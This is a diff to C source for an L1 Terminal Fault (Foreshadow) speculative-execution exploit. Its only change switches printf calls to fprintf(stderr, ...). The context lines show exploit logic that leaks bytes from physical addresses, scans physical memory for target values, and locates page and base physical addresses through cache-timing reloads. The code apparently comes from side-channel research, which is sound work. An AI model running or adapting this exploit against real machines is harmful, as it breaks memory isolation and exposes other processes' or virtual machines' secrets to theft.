@@ -172,7 +172,7 @@ void thijs_l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
   size_t(*results)[16] = malloc(results_size);
   memset(results, 0, results_size);
 
-  printf("Continously leaking %ld bytes from physcial address 0x%lx:\n", length, phys_addr);
+  fprintf(stderr, "Continously leaking %ld bytes from physcial address 0x%lx:\n", length, phys_addr);
   size_t start = (phys_addr & 0xfff);
   assert(start + length < 0xfff);
 
@@ -206,27 +206,27 @@ void thijs_l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
 
       size_t result = ((high & 0x0f) << 4) | (low & 0x0f);
       assembled_results[i / 2] = result;
-      printf("%02lx ", result);
+      fprintf(stderr, "%02lx ", result);
 
       if (i % (2 * bytes_per_line) == ((2 * bytes_per_line) - 2)) {
         // We would like to compare the results to the ground truth, to see the accuracy
-        printf("\t");
+        fprintf(stderr, "\t");
         size_t line = i / (2 * bytes_per_line);
         for (size_t byte = 0; byte < bytes_per_line; ++byte) {
           size_t idx = byte + (line * bytes_per_line);
           char out[3];
           escape_ascii(assembled_results[idx], out);
-          printf("%s", out);
+          fprintf(stderr, "%s", out);
         }
 
-        printf("          ");
+        fprintf(stderr, "          ");
 
-        printf("\n\r");
+        fprintf(stderr, "\n\r");
       }
     }
 
     // Restore cursor position
-    printf("\033[%ldA\r", length / bytes_per_line);
+    fprintf(stderr, "\033[%ldA\r", length / bytes_per_line);
   }
 
   free(assembled_results);
@@ -287,13 +287,13 @@ retry:
   }
 
   // // Sanity check using 2-byte granular leakage.
-  // printf("thijs_l1tf_leak sanity check | data = ");
+  // fprintf(stderr, "thijs_l1tf_leak sanity check | data = ");
   // display(data, length);
   // for (size_t i = 0; i+1 < length; i++) {
   //   int signal = l1tf_oracle16(*(uint16_t *)(data+i), phys_addr+i, 10000, NULL);
-  //   printf("thijs_l1tf_leak sanity check |     at data+%2lu, magic %hx, signal = %d\n", i, *(uint16_t *)(data+i), signal);
+  //   fprintf(stderr, "thijs_l1tf_leak sanity check |     at data+%2lu, magic %hx, signal = %d\n", i, *(uint16_t *)(data+i), signal);
   //   if (!signal) {
-  //     printf("thijs_l1tf_leak sanity check |         no signal --> retrying\n");
+  //     fprintf(stderr, "thijs_l1tf_leak sanity check |         no signal --> retrying\n");
   //     goto retry;
   //   }
   // }
@@ -351,11 +351,11 @@ void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size, char 
             for (size_t data_idx = 0; data_idx < 32; ++data_idx) {
               leaked_data[data_idx] = l1tf_full(&leak_ptr[data_idx], nibble_reload_buffer) & 0xff;
             }
-            printf("\n%p\t", (void *)ptr);
+            fprintf(stderr, "\n%p\t", (void *)ptr);
             for (size_t leaked_data_idx = 0; leaked_data_idx < 32; ++leaked_data_idx) {
-              printf("%.2x ", leaked_data[leaked_data_idx]);
+              fprintf(stderr, "%.2x ", leaked_data[leaked_data_idx]);
             }
-            printf("\n");
+            fprintf(stderr, "\n");
             fflush(stdout);
           }
         }
@@ -380,11 +380,11 @@ void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size, char 
               leaked_data[data_idx] = l1tf_full(&leak_ptr[data_idx], nibble_reload_buffer) & 0xff;
             }
             // if (leaked_data[6 + idx] == needle[idx] && leaked_data[7 + idx] == needle[idx + 1]) {
-            printf("\n%p\t", (void *)ptr);
+            fprintf(stderr, "\n%p\t", (void *)ptr);
             for (size_t leaked_data_idx = 0; leaked_data_idx < 32; ++leaked_data_idx) {
-              printf("%.2x ", leaked_data[leaked_data_idx]);
+              fprintf(stderr, "%.2x ", leaked_data[leaked_data_idx]);
             }
-            printf("\n");
+            fprintf(stderr, "\n");
             fflush(stdout);
             // }
           }
@@ -415,7 +415,7 @@ void l1tf_do_leak_nibblewise(const uintptr_t phys_addr, const size_t length) {
   uint8_t *results = malloc(results_size);
   memset(results, 0, results_size);
 
-  printf("Continously leaking %ld bytes from physcial address 0x%lx:\n", length, phys_addr);
+  fprintf(stderr, "Continously leaking %ld bytes from physcial address 0x%lx:\n", length, phys_addr);
   size_t start = (phys_addr & 0xfff);
   assert(start + length < 0xfff);
 
@@ -429,9 +429,9 @@ void l1tf_do_leak_nibblewise(const uintptr_t phys_addr, const size_t length) {
     }
 
     for (size_t i = 0; i < length; ++i) {
-      printf("%02x ", results[i]);
+      fprintf(stderr, "%02x ", results[i]);
     }
-    printf("\n");
+    fprintf(stderr, "\n");
   }
 
   free(results);
@@ -515,8 +515,8 @@ void l1tf_find_ffff_values(scan_opts_t scan_opts) {
       hot += l1tf_oracle16_9797_touch(own_pa, l1tfs_per_halt, reload_buffer, leak, p);
     }
     double time = (clock_read() - t_start) / 1000000000.0;
-    // printf("[%8.1f hits/sec]  hits = %ld,  time = %.1f sec, l1tfs_per_halt = %d\n", hot / time, hot, time, l1tfs_per_halt);
-    printf("[%6d, %10.1f],\n", l1tfs_per_halt, hot/time);
+    // fprintf(stderr, "[%8.1f hits/sec]  hits = %ld,  time = %.1f sec, l1tfs_per_halt = %d\n", hot / time, hot, time, l1tfs_per_halt);
+    fprintf(stderr, "[%6d, %10.1f],\n", l1tfs_per_halt, hot/time);
   }
 
   l1tf_leak_buffer_free(&leak);
@@ -592,9 +592,9 @@ void *l1tf_spawn_leak_page(void) {
     if (fd < 0) {
       err(EXIT_FAILURE, "Failed to open existing leak shm page");
     }
-    printf("Opened existing leak page!\n");
+    fprintf(stderr, "Opened existing leak page!\n");
   } else {
-    printf("Creating new leak page!\n");
+    fprintf(stderr, "Creating new leak page!\n");
     // Make sure the shared memory region is page in size
     if (ftruncate(fd, PAGE_SIZE) != 0) {
       int e = errno;
@@ -697,11 +697,11 @@ size_t l1tf_do_leak_nibblewise_prober(void *leak, void (*l1tf_leak_function)(voi
       ssize_t nibble = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)rlbuf, THRESHOLD);
 #if 0
       successful_hits += nibble > 0;
-      // if (nibble > 0) printf("l1tf_do_leak_nibblewise_prober: leak = %p | probe_nr = %2lu | attempt = %3ld | nibble = %1lx\n", leak, probe_nr, attempt, nibble);
+      // if (nibble > 0) fprintf(stderr, "l1tf_do_leak_nibblewise_prober: leak = %p | probe_nr = %2lu | attempt = %3ld | nibble = %1lx\n", leak, probe_nr, attempt, nibble);
       #define PERIOD_ITERS 10000000
       if (count++ >= PERIOD_ITERS) {
         double time = (clock_read() - start_time) / 1000000000.0;
-        printf("l1tf_do_leak_nibblewise_prober: %.1f K L1TFs/sec | %3lu successful hits | %5.2f%% succesfullness | %5.1f succes/sec\n",
+        fprintf(stderr, "l1tf_do_leak_nibblewise_prober: %.1f K L1TFs/sec | %3lu successful hits | %5.2f%% succesfullness | %5.1f succes/sec\n",
               PERIOD_ITERS/time/1000, successful_hits, 100.0*successful_hits/PERIOD_ITERS, successful_hits/time);
         count = 0;
         start_time = clock_read();
@@ -709,11 +709,11 @@ size_t l1tf_do_leak_nibblewise_prober(void *leak, void (*l1tf_leak_function)(voi
       }
 #endif
       if (nibble > 0) {
-        // printf("{%7d} ", i);
+        // fprintf(stderr, "{%7d} ", i);
         return nibble;
       }
     }
-    // printf("{%7d} ", i);
+    // fprintf(stderr, "{%7d} ", i);
     return 0;
 }
 
@@ -725,7 +725,7 @@ void l1tf_do_leak(const uintptr_t phys_addr, const size_t length)
   size_t(*results)[16] = malloc(results_size);
   memset(results, 0, results_size);
 
-  printf("Continously leaking %ld bytes from physcial address 0x%lx:\n", length, phys_addr);
+  fprintf(stderr, "Continously leaking %ld bytes from physcial address 0x%lx:\n", length, phys_addr);
   size_t start = (phys_addr & 0xfff);
   assert(start + length < 0xfff);
 
@@ -738,10 +738,10 @@ void l1tf_do_leak(const uintptr_t phys_addr, const size_t length)
       // Count the number of times each result has occured
       results[i][high]++;
       results[i + 1][low]++;
-      printf("%1lx%1lx ", high, low);
+      fprintf(stderr, "%1lx%1lx ", high, low);
       fflush(stdout);
     }
-    printf("\n");
+    fprintf(stderr, "\n");
   }
 
   free(results);
@@ -783,7 +783,7 @@ static void l1tf_core(char *leak) {
   #define PERIOD_ITERS 1000000
   if (verbose >= 1) if (nr_l1tfs++ >= PERIOD_ITERS) {
     double time = (clock_read() - period_start) / 1000000000.0;
-    printf("l1tf_do_leak_nibblewise_prober: %.1f K L1TFs/sec | %lu successful hits | %.2f%% succesfullness\n", PERIOD_ITERS/time/1000, success_hits, 100.0*success_hits/PERIOD_ITERS);
+    fprintf(stderr, "l1tf_do_leak_nibblewise_prober: %.1f K L1TFs/sec | %lu successful hits | %.2f%% succesfullness\n", PERIOD_ITERS/time/1000, success_hits, 100.0*success_hits/PERIOD_ITERS);
     nr_l1tfs = 0;
     period_start = clock_read();
     success_hits = 0;
@@ -797,7 +797,7 @@ static void rbuf_reload(void)
   for (int i = BYTE_END-1; i >= BYTE_START; i--) {
     if (access_time(rbuf[i]) < THRESHOLD) {
       hit[i]++;
-      if (verbose >= 2) if (i > 0) printf("lc = %8d | hit at %2x\n", lc, i);
+      if (verbose >= 2) if (i > 0) fprintf(stderr, "lc = %8d | hit at %2x\n", lc, i);
       success_hits++;
     }
   }
@@ -810,8 +810,8 @@ static int hit_analyze(void)
   if (verbose) {
     for (int i = 0; i < 256; i++)
       if (hit[i] > 0)
-        printf("hit[%02x] = %d\n", i, hit[i]);
-    printf("\n");
+        fprintf(stderr, "hit[%02x] = %d\n", i, hit[i]);
+    fprintf(stderr, "\n");
   }
 
   int r = max_idx(&hit[1], 255) + 1;
@@ -849,7 +849,7 @@ char *mathe_l1tf_leak(uintptr_t base, uintptr_t pa, int nr_bytes)
   memset(secret, 0, nr_bytes);
 
   for (int i = 0; i < nr_bytes; i++) {
-    if (verbose >= 2) printf("l1tf_leak: at byte %d\n", i);
+    if (verbose >= 2) fprintf(stderr, "l1tf_leak: at byte %d\n", i);
     char *leak = leak_addr.leak + (((pa + i) & 0xfff));
     secret[i] = do_l1tf_leak(leak);
     // secret[i] = do_l1tf_leak((char *)&bla + i);
@@ -888,7 +888,7 @@ int l1tf_test(void *va, uintptr_t pa, int iters)
   uint64_t t_start = clock_read();
   int hits = l1tf_oracle16(*(uint64_t *)va, pa, iters, va);
   double time = (clock_read()-t_start)/1000000000.0;
-  printf("l1tf_test: hits %6d (%4.1f%%) | hits/sec %6.1f K | iters/sec %6.1f K\n",
+  fprintf(stderr, "l1tf_test: hits %6d (%4.1f%%) | hits/sec %6.1f K | iters/sec %6.1f K\n",
       hits, 100.0*hits/iters, hits/time/1000, iters/time/1000);
   return hits;
 }
@@ -900,7 +900,7 @@ int l1tf_test_base(uintptr_t pa, int iters)
   int hits = l1tf_oracle16(0xffff, pa+6, iters, NULL);
   double time = (clock_read()-t_start)/1000000000.0;
   spectre_touch_base_stop();
-  printf("l1tf_test_base: hits %6d (%4.1f%%) | hits/sec %6.1f K | iters/sec %6.1f K\n",
+  fprintf(stderr, "l1tf_test_base: hits %6d (%4.1f%%) | hits/sec %6.1f K | iters/sec %6.1f K\n",
       hits, 100.0*hits/iters, hits/time/1000, iters/time/1000);
   return hits;
 }
@@ -911,7 +911,7 @@ uintptr_t l1tf_find_page_pa(void *p)
 
 #if HELPERS
   uintptr_t real_pa = helper_find_page_pa(p);
-  if (verbose >= 1) printf("l1tf_find_page_pa: the real pa is at %10lx\n", real_pa);
+  if (verbose >= 1) fprintf(stderr, "l1tf_find_page_pa: the real pa is at %10lx\n", real_pa);
 #endif
 
   uint64_t t_start = clock_read();
@@ -923,9 +923,9 @@ uintptr_t l1tf_find_page_pa(void *p)
     // uintptr_t start = real_pa-512*1024*1024; uintptr_t end = real_pa+HUGE_PAGE_SIZE;
     for (uintptr_t pa = start; pa < end; pa += PAGE_SIZE) {
       if (verbose >= 2) if (pa % (16*1024*1024) == 0) {
-        printf("l1tf_find_page_pa: run %3d  |  pa  %12lx", run, pa);
+        fprintf(stderr, "l1tf_find_page_pa: run %3d  |  pa  %12lx", run, pa);
         fflush(stdout);
-        printf("\33[2K\r");
+        fprintf(stderr, "\33[2K\r");
       }
 
       int off;
@@ -937,13 +937,13 @@ uintptr_t l1tf_find_page_pa(void *p)
         int hits = l1tf_oracle16(magic, pa_q, iters, q);
         if (!hits)
           break;
-        if (verbose >= 1) printf("l1tf_find_page_pa: run %3d  | va %14p  |  pa %12lx  |  hits %4d\n", run, q, pa_q, hits);
+        if (verbose >= 1) fprintf(stderr, "l1tf_find_page_pa: run %3d  | va %14p  |  pa %12lx  |  hits %4d\n", run, q, pa_q, hits);
       }
       if (off == 8) {
         if (verbose >= 1) {
           double time = (clock_read()-t_start)/1000000000.0;
           uintptr_t len = (pa-start) + run*(end-start);
-          printf("l1tf_find_page_pa: found pa %lx in %.1f sec (%.1f MB/s)\n", pa, time, len/time / (1024*1024));
+          fprintf(stderr, "l1tf_find_page_pa: found pa %lx in %.1f sec (%.1f MB/s)\n", pa, time, len/time / (1024*1024));
         }
         return pa;
       }
@@ -955,11 +955,11 @@ uintptr_t l1tf_find_page_pa(void *p)
 uintptr_t l1tf_find_base(void)
 {
   const int verbose = 1;
-	printf("\nl1tf_find_base()\n" HLINE);
+	fprintf(stderr, "\nl1tf_find_base()\n" HLINE);
 
 #if HELPERS
   uintptr_t real_pa = helper_base_pa();
-  if (verbose >= 1) printf("l1tf_find_base: base's real pa is %10lx\n", real_pa);
+  if (verbose >= 1) fprintf(stderr, "l1tf_find_base: base's real pa is %10lx\n", real_pa);
 #endif
 
   spectre_touch_base_start();
@@ -970,9 +970,9 @@ uintptr_t l1tf_find_base(void)
     // uintptr_t start = real_pa-512*1024*1024; uintptr_t end = real_pa+HUGE_PAGE_SIZE;
     for (uintptr_t pa = start; pa < end; pa += PAGE_SIZE) {
       if (verbose >= 2) if (pa % (16*1024*1024) == (start & 0xfff)) {
-        printf("l1tf_find_base: run %3d  |  pa  %12lx", run, pa);
+        fprintf(stderr, "l1tf_find_base: run %3d  |  pa  %12lx", run, pa);
         fflush(stdout);
-        printf("\33[2K\r");
+        fprintf(stderr, "\33[2K\r");
       }
 
       int off;
@@ -980,7 +980,7 @@ uintptr_t l1tf_find_base(void)
         int hits = l1tf_oracle16(0xffff, pa+6+off, 3+off*1000, NULL);
         if (!hits)
           break;
-        if (verbose >= 1) printf("l1tf_find_base: run %3d  | pa %12lx  |  hits %4d\n", run, pa+off, hits);
+        if (verbose >= 1) fprintf(stderr, "l1tf_find_base: run %3d  | pa %12lx  |  hits %4d\n", run, pa+off, hits);
       }
       if (off >= 16) {
         spectre_touch_base_stop();
@@ -988,7 +988,7 @@ uintptr_t l1tf_find_base(void)
         if (verbose >= 1) {
           double time = (clock_read()-t_start)/1000000000.0;
           uintptr_t len = (pa-start) + run*(end-start);
-          printf("l1tf_find_base: found pa %lx in %.1f sec (%.1f MB/s)\n", pa, time, len/time / (1024*1024));
+          fprintf(stderr, "l1tf_find_base: found pa %lx in %.1f sec (%.1f MB/s)\n", pa, time, len/time / (1024*1024));
           l1tf_test_base(pa, 100000);
         }
         return pa;
@@ -1021,12 +1021,12 @@ hpa_t l1tf_find_magic16(hpa_t base, uint16_t magic, hpa_t start, hpa_t end, int 
 
       int hits = l1tf_oracle16(magic, pa, iters, NULL);
       if (hits) {
-        if (verbose) printf("pa = %16lx  hits = %d\n", pa, hits);
+        if (verbose) fprintf(stderr, "pa = %16lx  hits = %d\n", pa, hits);
         break;
       }
     }
     if (run % 100 == 0)
-      printf(" run = %d\n", run);
+      fprintf(stderr, " run = %d\n", run);
   }
   half_spectre_stop();
   if (pa >= end)
@@ -1113,15 +1113,15 @@ static char node_aggregate(node_t *node)
 
 static void node_print(node_t *node)
 {
-  printf("node @pa %10lx agg=%02x high={", node->pa, (uint8_t)node_aggregate(node));
+  fprintf(stderr, "node @pa %10lx agg=%02x high={", node->pa, (uint8_t)node_aggregate(node));
   for (int i = 0; i < 16; i++)
     if (node->high[i])
-      printf("%hux%x,", node->high[i], i);
-  printf("} low={");
+      fprintf(stderr, "%hux%x,", node->high[i], i);
+  fprintf(stderr, "} low={");
       for (int i = 0; i < 16; i++)
         if (node->low[i])
-        printf("%hux%x,", node->low[i], i);
-  printf("}\n");
+        fprintf(stderr, "%hux%x,", node->low[i], i);
+  fprintf(stderr, "}\n");
 }
 
 int confidently_cached(hpa_t pa, u64 len)
@@ -1162,7 +1162,7 @@ int confidently_cached(hpa_t pa, u64 len)
 void l1tf_leak(char *data, uintptr_t base, uintptr_t pa, uintptr_t len)
 {
   const int verbose = 0;
-  if (verbose) printf("\n");
+  if (verbose) fprintf(stderr, "\n");
 
   if (!confidently_cached(pa, len))
     _l1tf_leak(data, base, pa, len);
@@ -1178,7 +1178,7 @@ void l1tf_leak(char *data, uintptr_t base, uintptr_t pa, uintptr_t len)
   }
 
   if (verbose && confidently_cached(pa, len))
-    printf("condifently cached results already; skipped extra l1tf leaking (CACHED)\n");
+    fprintf(stderr, "condifently cached results already; skipped extra l1tf leaking (CACHED)\n");
 }
 
 void l1tf_purge_cache(hpa_t pa, u64 len)
